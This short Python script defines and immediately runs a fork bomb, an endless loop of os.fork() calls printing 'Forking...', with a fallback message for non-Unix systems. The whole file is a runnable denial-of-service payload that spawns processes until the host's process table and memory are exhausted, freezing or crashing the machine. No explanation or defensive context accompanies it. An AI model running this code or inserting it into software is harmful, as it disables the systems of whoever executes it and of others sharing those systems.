import os

def fork_bomb():
    while True:
        os.fork()  # Creates new processes indefinitely (Unix only)
        print("Forking...")

try:
    fork_bomb()
except AttributeError:
    print("Fork bomb only works on Unix-like systems!")
